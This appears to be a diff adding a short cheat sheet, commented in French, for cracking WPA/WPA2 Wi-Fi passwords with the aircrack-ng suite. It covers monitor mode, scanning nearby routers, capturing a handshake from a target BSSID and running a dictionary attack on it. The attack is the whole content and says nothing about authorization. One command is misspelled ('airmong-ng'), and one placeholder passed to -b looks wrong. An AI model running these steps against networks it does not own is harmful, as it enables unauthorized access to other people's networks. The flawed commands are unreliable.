@@ -1,0 +1,21 @@
+## Activez le mode moniteur (airmon-ng)
+sudo airmon-ng
+
+## [MONITOR] is under "interface"
+airmong-ng start [MONITOR]
+
+## Activez l’interface du mode moniteur
+iwconfig
+
+## Tuez tous les processus qui renvoient une erreur
+airmon-ng check kill
+
+## Lancez l'écoute des routeurs du secteur
+airodump-ng [MONITOR]
+## Surveillez votre réseau à la recherche de l’établissement d’une liaison
+airodump-ng -c [CH] --bssid [BSSID] -w (le dossier ou va être stocker
+votre résultat) [VOTRE MONITEUR]
+
+## Renommez le fichier contenant la clef cryptée
+## Lancement du déchiffrage de la clé grâce au dictionnaire
+aircrack-ng -a2 -b [HANDSHAKE] -w [DICTIONNAIRE] [MDP.cap]
